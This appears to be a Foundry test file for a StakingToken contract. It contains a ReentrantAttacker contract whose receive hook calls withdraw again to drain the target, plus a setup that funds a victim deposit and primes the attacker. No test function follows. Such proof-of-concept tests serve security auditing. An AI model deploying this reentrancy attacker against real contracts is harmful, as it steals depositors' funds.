pragma solidity ^0.8.10;
import { Test } from "forge-std/Test.sol";
import { StakingToken } from "src/StakingToken.sol";

contract ReentrantAttacker {
    StakingToken public target;

    constructor(StakingToken _t) {
        target = _t;
    }

    function prime() external payable {
        target.deposit{value: msg.value}();
    }

    function attack(uint256 amt) external {
        (bool ok, ) = address(target).call(abi.encodeWithSignature("withdraw(uint256)", amt));
        require(ok, "withdraw failed");
    }

    receive() external payable {
        if (address(target).balance > 0) {
            address(target).call(abi.encodeWithSignature("withdraw(uint256)", 1 ether));
        }
    }
}

contract StakingTokenTest is Test {
    StakingToken staking;
    ReentrantAttacker attacker;

    function setUp() public {
        // Deploy StakingToken instance
        staking = new StakingToken();
        vm.label(address(staking), "StakingToken");

        // Fund target via victim deposit
        address victim = makeAddr("victim");
        deal(victim, 200 ether);
        vm.prank(victim);
        staking.deposit{value: 150 ether}();
        assertEq(address(staking).balance, 150 ether);

        // Deploy reentrant attacker
        attacker = new ReentrantAttacker(staking);
        vm.label(address(attacker), "ReentrantAttacker");

        // Prime attacker with a small deposit
        deal(address(attacker), 2 ether);
        deal(address(this), 1 ether);
        attacker.prime{value: 1 ether}();
        assertEq(address(staking).balance, 151 ether);
    }


}
